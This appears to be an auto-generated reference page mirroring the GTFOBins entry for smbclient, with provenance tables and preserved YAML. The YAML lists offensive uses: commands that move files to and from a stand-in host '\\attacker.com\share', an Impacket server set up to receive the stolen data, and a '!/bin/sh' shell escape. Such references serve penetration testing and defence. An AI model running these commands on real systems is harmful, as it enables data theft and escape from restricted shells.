---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# smbclient

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `smbclient` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/smbclient` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [smbclient](../../tools/linux/smbclient.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | smbclient |
| name | smbclient |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/smbclient/ |

## Preserved Source Material

```yaml
_body: ''
_name: smbclient
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/smbclient
functions:
  download:
  - code: smbclient '\\attacker.com\share' -c 'get /path/to/input-file /path/to/output-file'
    contexts:
      sudo: null
      unprivileged: null
    sender:
      code: smbserver.py -smb2support share .
      comment: A SMB/CIFS server can be used on the attacker box to receive the data (e.g, using [Impacket](https://github.com/SecureAuthCorp/impacket)).
  shell:
  - code: 'smbclient ''\\host\share''

      !/bin/sh'
    comment: A valid SMB/CIFS server must be available.
    contexts:
      sudo: null
      unprivileged: null
  upload:
  - code: smbclient '\\attacker.com\share' -c 'put /path/to/input-file /path/to/output-file'
    contexts:
      sudo: null
      unprivileged: null
    receiver:
      code: smbserver.py -smb2support share .
      comment: A SMB/CIFS server can be used on the attacker box to receive the data (e.g, using [Impacket](https://github.com/SecureAuthCorp/impacket)).
```
